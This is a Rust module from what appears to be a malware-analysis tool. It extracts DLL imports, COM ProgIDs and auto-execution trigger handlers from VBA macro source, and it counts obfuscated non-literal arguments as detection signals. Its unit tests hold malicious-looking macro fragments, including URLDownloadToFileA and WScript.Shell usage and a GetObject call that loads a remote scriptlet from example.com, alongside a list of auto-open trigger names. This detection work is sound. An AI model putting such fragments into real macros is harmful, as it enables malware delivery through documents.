//! VBA symbol extraction over decompressed module source.
//!
//! Surfaces structured `Import`/`Function` records so trait authors
//! can use `type: symbol` matchers (faster, no comment/string false
//! positives, normalization-aware) instead of brittle `type: raw`
//! regexes against the module text.
//!
//! There is no Rust tree-sitter grammar for VBA worth depending on
//! (`tree-sitter-vbscript` exists but does not cover `Declare PtrSafe`,
//! the `Lib` clause, or `Alias` properly). This is a targeted regex
//! extractor that handles the high-value cases:
//!
//! - `Declare [PtrSafe] Function|Sub NAME Lib "LIB" [Alias "ALIAS"]`
//! - `CreateObject("PROGID")` / `GetObject(... , "PROGID")`
//! - `Sub NAME` / `Function NAME` declarations (incl. `Public`/`Private`)
//!
//! Pre-processing joins MS-VBA line continuations (`_` at end-of-line)
//! and strips `'` line comments and `Rem` lines so a comment between
//! tokens doesn't break a Declare match. Offsets reported in the
//! resulting symbols are relative to the *original* source bytes.
//!
//! Non-literal `Lib`/`CreateObject` arguments emit the sentinel
//! library value [`NON_LITERAL_SENTINEL`] — they are the strongest
//! single obfuscation signal and feed
//! `office.vba.declare_non_literal_count` /
//! `office.vba.createobject_non_literal_count` metrics.

use regex::Regex;
use std::sync::OnceLock;

use crate::output::{Function, Import};

/// Sentinel library/argument value emitted when a Declare's `Lib`
/// clause or a CreateObject/GetObject argument is not a string
/// literal — i.e., the import target is built at runtime.
pub const NON_LITERAL_SENTINEL: &str = "<non-literal>";

/// Aggregate counters from one module's symbol extraction. The
/// caller folds these into per-document metrics.
#[derive(Debug, Default, Clone, Copy)]
pub struct VbaSymbolStats {
    /// Total `Declare … Function|Sub … Lib` statements.
    pub declare_count: u32,
    /// Of those, the count whose `Lib` clause was not a string literal.
    pub declare_non_literal_count: u32,
    /// Total `CreateObject(…)` calls.
    pub createobject_count: u32,
    /// Of those, the count whose ProgID argument was not a string literal.
    pub createobject_non_literal_count: u32,
    /// Total `GetObject(…)` calls.
    pub getobject_count: u32,
    /// Of those, the count whose moniker/ProgID argument was not literal.
    pub getobject_non_literal_count: u32,
    /// Distinct trigger handlers observed (`Document_Open`,
    /// `Workbook_Open`, `Auto_Open`, …).
    pub trigger_handler_count: u32,
}

/// Run the four extractors over one module's source. Pushes records
/// into `imports_out` / `functions_out` and returns the per-module
/// aggregate counters.
///
/// This is the single source of truth for VBA symbol extraction.
/// Other crates that need the same semantics should call this rather
/// than re-implementing the regex set.
pub fn extract(
    source: &str,
    imports_out: &mut crate::output::Imports,
    functions_out: &mut crate::output::Functions,
) -> VbaSymbolStats {
    let mut stats = VbaSymbolStats::default();
    if source.is_empty() {
        return stats;
    }
    let prepared = preprocess(source);
    extract_declares(&prepared, imports_out, &mut stats);
    extract_createobject(&prepared, imports_out, &mut stats, false);
    extract_createobject(&prepared, imports_out, &mut stats, true);
    extract_subs_and_functions(&prepared, functions_out, &mut stats);
    stats
}

/// Pre-processed VBA source with line-continuation joined and line
/// comments stripped, plus a per-byte mapping back to original
/// offsets.
struct Prepared {
    text: String,
    map: Vec<usize>,
}

impl Prepared {
    fn original_offset(&self, idx: usize) -> usize {
        if idx < self.map.len() {
            self.map[idx]
        } else {
            *self.map.last().unwrap_or(&0)
        }
    }
}

/// Join `_` line-continuations and strip `'` line comments / `Rem`
/// lines. Tracks string literals so an apostrophe inside `"…'…"` is
/// preserved.
fn preprocess(source: &str) -> Prepared {
    let bytes = source.as_bytes();
    let mut text = String::with_capacity(source.len());
    let mut map = Vec::with_capacity(source.len());

    let mut i = 0;
    while i < bytes.len() {
        // VBA line continuation: `_` followed (after optional
        // whitespace) by a line terminator. Replace the joined break
        // with a single space so adjacent tokens don't merge.
        if bytes[i] == b'_' && {
            let mut j = i + 1;
            while j < bytes.len() && (bytes[j] == b' ' || bytes[j] == b'\t') {
                j += 1;
            }
            j < bytes.len() && (bytes[j] == b'\n' || bytes[j] == b'\r')
        } {
            let mut j = i + 1;
            while j < bytes.len() && (bytes[j] == b' ' || bytes[j] == b'\t') {
                j += 1;
            }
            if j < bytes.len() && bytes[j] == b'\r' {
                j += 1;
            }
            if j < bytes.len() && bytes[j] == b'\n' {
                j += 1;
            }
            while text.ends_with(' ') || text.ends_with('\t') {
                text.pop();
                map.pop();
            }
            text.push(' ');
            map.push(i);
            i = j;
            continue;
        }

        // Strip line-leading `Rem` comments (case-insensitive).
        let at_line_start = text.is_empty() || text.ends_with('\n');
        if at_line_start && i + 3 <= bytes.len() {
            let head = &bytes[i..(i + 3).min(bytes.len())];
            let is_rem = head.eq_ignore_ascii_case(b"Rem");
            let next = bytes.get(i + 3).copied().unwrap_or(b'\n');
            if is_rem && (next == b' ' || next == b'\t' || next == b'\r' || next == b'\n') {
                let mut j = i;
                while j < bytes.len() && bytes[j] != b'\n' {
                    j += 1;
                }
                i = j;
                continue;
            }
        }

        // Strip apostrophe comments outside of string literals.
        if bytes[i] == b'\'' {
            let line_start = text.rfind('\n').map(|n| n + 1).unwrap_or(0);
            let line_so_far = &text[line_start..];
            let in_string = line_so_far.chars().filter(|c| *c == '"').count() % 2 == 1;
            if !in_string {
                let mut j = i;
                while j < bytes.len() && bytes[j] != b'\n' {
                    j += 1;
                }
                i = j;
                continue;
            }
        }

        text.push(bytes[i] as char);
        map.push(i);
        i += 1;
    }

    Prepared { text, map }
}

fn declare_re() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        Regex::new(
            r#"(?ix)
            \b Declare \s+ (?: PtrSafe \s+ )?
            (Function | Sub) \s+
            ([A-Za-z_][A-Za-z0-9_]*) \s+
            Lib \s+
            ( "[^"]*" | [^\s(]+ )
            (?: \s+ Alias \s+ "([^"]*)" )?
            "#,
        )
        .expect("declare_re compiles")
    })
}

fn extract_declares(
    prep: &Prepared,
    imports_out: &mut crate::output::Imports,
    stats: &mut VbaSymbolStats,
) {
    for cap in declare_re().captures_iter(&prep.text) {
        stats.declare_count = stats.declare_count.saturating_add(1);

        let lib_raw = cap.get(3).map(|m| m.as_str()).unwrap_or("");
        let (lib_label, is_literal) = classify_lib(lib_raw);
        if !is_literal {
            stats.declare_non_literal_count = stats.declare_non_literal_count.saturating_add(1);
        }

        // Prefer the Alias when present — that's the actual exported
        // name in the DLL. Otherwise the local declared name is the
        // import name.
        let alias = cap.get(4).map(|m| m.as_str().to_string());
        let local = cap
            .get(2)
            .map(|m| m.as_str().to_string())
            .unwrap_or_default();
        let import_name = alias.unwrap_or(local);
        if import_name.is_empty() {
            continue;
        }

        let offset = cap
            .get(0)
            .map(|m| prep.original_offset(m.start()))
            .unwrap_or(0) as u64;

        imports_out.push(Import {
            name: import_name,
            library: Some(lib_label),
            source: "vba-declare",
            offset: Some(offset),
            ordinal: None,
        });
    }
}

/// Classify a `Lib` expression. Returns (label, is_literal). Literal
/// libs are lowercased and any `.dll` suffix is stripped.
fn classify_lib(raw: &str) -> (String, bool) {
    let t = raw.trim();
    if t.starts_with('"') && t.ends_with('"') && t.len() >= 2 {
        let inner = &t[1..t.len() - 1];
        let stem = inner
            .strip_suffix(".dll")
            .or_else(|| inner.strip_suffix(".DLL"))
            .or_else(|| inner.strip_suffix(".Dll"))
            .unwrap_or(inner);
        (stem.to_ascii_lowercase(), true)
    } else {
        (NON_LITERAL_SENTINEL.to_string(), false)
    }
}

fn createobject_re() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        Regex::new(r#"(?ix)\b CreateObject \s* \( \s* ( "[^"]*" | [^,)]+ )"#)
            .expect("createobject_re compiles")
    })
}

fn getobject_re() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        Regex::new(
            r#"(?ix)\b GetObject \s* \( \s* ( "[^"]*" | [^,)]+ ) (?: \s* , \s* ( "[^"]*" | [^,)]+ ) )?"#,
        )
        .expect("getobject_re compiles")
    })
}

fn extract_createobject(
    prep: &Prepared,
    imports_out: &mut crate::output::Imports,
    stats: &mut VbaSymbolStats,
    is_get: bool,
) {
    let (re, source_label, lib_label) = if is_get {
        (getobject_re(), "vba-getobject", "com-getobject")
    } else {
        (createobject_re(), "vba-createobject", "com")
    };

    for cap in re.captures_iter(&prep.text) {
        // For GetObject prefer the second arg (ProgID); otherwise
        // the first arg is the moniker (path/URL).
        let (raw, second_present) = if is_get {
            match cap.get(2) {
                Some(m) => (m.as_str(), true),
                None => (cap.get(1).map(|m| m.as_str()).unwrap_or(""), false),
            }
        } else {
            (cap.get(1).map(|m| m.as_str()).unwrap_or(""), false)
        };

        if is_get {
            stats.getobject_count = stats.getobject_count.saturating_add(1);
        } else {
            stats.createobject_count = stats.createobject_count.saturating_add(1);
        }

        let (label, is_literal) = classify_arg(raw);
        if !is_literal {
            if is_get {
                stats.getobject_non_literal_count =
                    stats.getobject_non_literal_count.saturating_add(1);
            } else {
                stats.createobject_non_literal_count =
                    stats.createobject_non_literal_count.saturating_add(1);
            }
        }

        // Only emit Imports for ProgID-style data: literal
        // CreateObject args, or literal *second* args of GetObject.
        // A bare GetObject moniker (`"file:..."`) is not a ProgID.
        let emit = !is_get || second_present;
        if !emit {
            continue;
        }

        let offset = cap
            .get(0)
            .map(|m| prep.original_offset(m.start()))
            .unwrap_or(0) as u64;
        imports_out.push(Import {
            name: label,
            library: Some(lib_label.to_string()),
            source: source_label,
            offset: Some(offset),
            ordinal: None,
        });
    }
}

/// Classify a CreateObject/GetObject argument. Returns (label,
/// is_literal).
fn classify_arg(raw: &str) -> (String, bool) {
    let t = raw.trim();
    if t.starts_with('"') && t.ends_with('"') && t.len() >= 2 {
        let inner = &t[1..t.len() - 1];
        (inner.to_string(), true)
    } else {
        (NON_LITERAL_SENTINEL.to_string(), false)
    }
}

fn sub_func_re() -> &'static Regex {
    static R: OnceLock<Regex> = OnceLock::new();
    R.get_or_init(|| {
        Regex::new(
            r"(?im)^\s*(?:Public\s+|Private\s+|Friend\s+|Static\s+){0,2}(Sub|Function)\s+([A-Za-z_][A-Za-z0-9_]*)",
        )
        .expect("sub_func_re compiles")
    })
}

/// VBA trigger-handler names. Real-world malware leans on
/// `Auto_Open`, `Document_Open`, `Workbook_Open`, …; emitting them
/// as a `trigger_handler_count` aggregate lets a trait fire on
/// "any auto-execution vector" without enumerating every name.
const TRIGGER_NAMES: &[&str] = &[
    "Auto_Open",
    "AutoOpen",
    "Auto_Close",
    "AutoClose",
    "AutoExec",
    "AutoExit",
    "AutoNew",
    "Document_Open",
    "Document_New",
    "Document_Close",
    "Document_BeforeClose",
    "Document_BeforePrint",
    "Document_BeforeSave",
    "Document_ContentControlOnEnter",
    "Workbook_Open",
    "Workbook_Activate",
    "Workbook_Deactivate",
    "Workbook_BeforeClose",
    "Workbook_BeforeSave",
    "Workbook_BeforePrint",
    "Worksheet_Activate",
    "Worksheet_Calculate",
    "Worksheet_Change",
    "Worksheet_SelectionChange",
    "UserForm_Activate",
    "UserForm_Initialize",
    "UserForm_Click",
    "UserForm_Layout",
    "Chart_Activate",
    "Chart_Calculate",
    "App_NewMail",
];

fn is_trigger_name(name: &str) -> bool {
    TRIGGER_NAMES.iter().any(|t| t.eq_ignore_ascii_case(name))
}

fn extract_subs_and_functions(
    prep: &Prepared,
    functions_out: &mut crate::output::Functions,
    stats: &mut VbaSymbolStats,
) {
    // Skip names whose match start lies inside a Declare match —
    // those are already emitted as imports.
    let declare_spans: Vec<(usize, usize)> = declare_re()
        .find_iter(&prep.text)
        .map(|m| (m.start(), m.end()))
        .collect();

    for cap in sub_func_re().captures_iter(&prep.text) {
        let Some(m) = cap.get(0) else { continue };
        let inside_declare = declare_spans
            .iter()
            .any(|(s, e)| m.start() >= *s && m.start() < *e);
        if inside_declare {
            continue;
        }

        let kind = cap.get(1).map(|m| m.as_str()).unwrap_or("");
        let name = match cap.get(2) {
            Some(n) => n.as_str().to_string(),
            None => continue,
        };
        let offset = prep.original_offset(m.start()) as u64;

        if is_trigger_name(&name) {
            stats.trigger_handler_count = stats.trigger_handler_count.saturating_add(1);
        }

        // Pike-style kind tag — distinguish `Sub` (no return value)
        // from `Function` so consumers don't have to lowercase /
        // string-compare.
        let kind_tag: Option<&'static str> = if kind.eq_ignore_ascii_case("sub") {
            Some("sub")
        } else if kind.eq_ignore_ascii_case("function") {
            Some("function")
        } else {
            None
        };

        functions_out.push(Function {
            name,
            source: "vba-decl",
            offset: Some(offset),
            kind: kind_tag,
        });
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::output::{Functions, Imports};

    fn run(src: &str) -> (Imports, Functions, VbaSymbolStats) {
        let mut imports = Imports::new();
        let mut functions = Functions::new();
        let stats = extract(src, &mut imports, &mut functions);
        (imports, functions, stats)
    }

    #[test]
    fn declare_with_alias_emits_alias_as_symbol() {
        let src = r#"
            Declare PtrSafe Function vAlloc Lib "kernel32" Alias "VirtualAlloc" _
              (ByVal lpAddress As LongPtr) As LongPtr
        "#;
        let (imp, _, stats) = run(src);
        assert_eq!(imp.len(), 1);
        let i = imp.iter().next().unwrap();
        assert_eq!(i.name, "VirtualAlloc");
        assert_eq!(i.library.as_deref(), Some("kernel32"));
        assert_eq!(i.source, "vba-declare");
        assert_eq!(stats.declare_count, 1);
        assert_eq!(stats.declare_non_literal_count, 0);
    }

    #[test]
    fn declare_handles_case_whitespace_and_dll_suffix() {
        let src = "declare\tFunction\tLoadLibraryA\tlib \"KERNEL32.dll\"\t(s As String)\n";
        let (imp, _, _) = run(src);
        assert_eq!(imp.len(), 1);
        let i = imp.iter().next().unwrap();
        assert_eq!(i.name, "LoadLibraryA");
        assert_eq!(i.library.as_deref(), Some("kernel32"));
    }

    #[test]
    fn declare_with_line_continuation() {
        let src = "Declare PtrSafe Function f _\n  Lib \"urlmon\" _\n  Alias \"URLDownloadToFileA\" (a As Long)\n";
        let (imp, _, _) = run(src);
        assert_eq!(imp.len(), 1);
        let i = imp.iter().next().unwrap();
        assert_eq!(i.name, "URLDownloadToFileA");
        assert_eq!(i.library.as_deref(), Some("urlmon"));
    }

    #[test]
    fn declare_skips_apostrophe_comment_between_tokens() {
        let src = "Declare Function CreateProcessA _\n  ' comment that hides intent\n  Lib \"kernel32\" (a As Long)\n";
        let (imp, _, _) = run(src);
        assert_eq!(imp.len(), 1);
        assert_eq!(imp.iter().next().unwrap().name, "CreateProcessA");
    }

    #[test]
    fn declare_with_non_literal_lib_emits_sentinel() {
        let src = r#"Declare Function f Lib dllName Alias "VirtualProtect" () As Long"#;
        let (imp, _, stats) = run(src);
        assert_eq!(imp.len(), 1);
        let i = imp.iter().next().unwrap();
        assert_eq!(i.name, "VirtualProtect");
        assert_eq!(i.library.as_deref(), Some(NON_LITERAL_SENTINEL));
        assert_eq!(stats.declare_non_literal_count, 1);
    }

    #[test]
    fn apostrophe_inside_string_literal_is_preserved() {
        let src = "x = \"it's fine\"\nDeclare Function K Lib \"kernel32\" (s As Long)\n";
        let (imp, _, _) = run(src);
        assert_eq!(imp.len(), 1);
        assert_eq!(imp.iter().next().unwrap().name, "K");
    }

    #[test]
    fn createobject_literal_progid() {
        let src = r#"Set sh = CreateObject("WScript.Shell")"#;
        let (imp, _, stats) = run(src);
        assert_eq!(imp.len(), 1);
        let i = imp.iter().next().unwrap();
        assert_eq!(i.name, "WScript.Shell");
        assert_eq!(i.library.as_deref(), Some("com"));
        assert_eq!(i.source, "vba-createobject");
        assert_eq!(stats.createobject_count, 1);
        assert_eq!(stats.createobject_non_literal_count, 0);
    }

    #[test]
    fn createobject_non_literal_arg() {
        let src = r#"Set x = CreateObject(progName & ".Sh" & "ell")"#;
        let (imp, _, stats) = run(src);
        assert_eq!(imp.len(), 1);
        assert_eq!(imp.iter().next().unwrap().name, NON_LITERAL_SENTINEL);
        assert_eq!(stats.createobject_non_literal_count, 1);
    }

    #[test]
    fn getobject_two_arg_form_yields_progid_only() {
        let src = r#"Set xl = GetObject("c:\book.xls", "Excel.Application")"#;
        let (imp, _, stats) = run(src);
        assert_eq!(imp.len(), 1);
        let i = imp.iter().next().unwrap();
        assert_eq!(i.name, "Excel.Application");
        assert_eq!(i.library.as_deref(), Some("com-getobject"));
        assert_eq!(stats.getobject_count, 1);
    }

    #[test]
    fn getobject_one_arg_emits_no_symbol() {
        let src = r#"Set f = GetObject("script:http://example.com/payload.sct")"#;
        let (imp, _, stats) = run(src);
        assert_eq!(imp.len(), 0);
        assert_eq!(stats.getobject_count, 1);
    }

    #[test]
    fn sub_function_declarations_extracted_excluding_declare() {
        let src = "Public Sub Document_Open()\nEnd Sub\n\nPrivate Function helper(x)\nEnd Function\n\nDeclare Function notAFunction Lib \"k32\" () As Long\n";
        let (_, funcs, stats) = run(src);
        let names: Vec<&str> = funcs.iter().map(|f| f.name.as_str()).collect();
        assert!(names.contains(&"Document_Open"));
        assert!(names.contains(&"helper"));
        assert!(!names.contains(&"notAFunction"));
        assert_eq!(stats.trigger_handler_count, 1);
    }

    #[test]
    fn trigger_handler_count_aggregates_distinct_triggers() {
        let src =
            "Sub Document_Open()\nEnd Sub\nSub Workbook_Open()\nEnd Sub\nSub helper()\nEnd Sub\n";
        let (_, _, stats) = run(src);
        assert_eq!(stats.trigger_handler_count, 2);
    }

    #[test]
    fn rem_comment_line_is_stripped() {
        let src = "Rem Declare Function fake Lib \"x\" ()\nDeclare Function real Lib \"k32\" () As Long\n";
        let (imp, _, _) = run(src);
        assert_eq!(imp.len(), 1);
        assert_eq!(imp.iter().next().unwrap().name, "real");
    }

    #[test]
    fn empty_source_returns_zero_stats() {
        let (imp, funcs, stats) = run("");
        assert!(imp.is_empty());
        assert!(funcs.is_empty());
        assert_eq!(stats.declare_count, 0);
    }
}
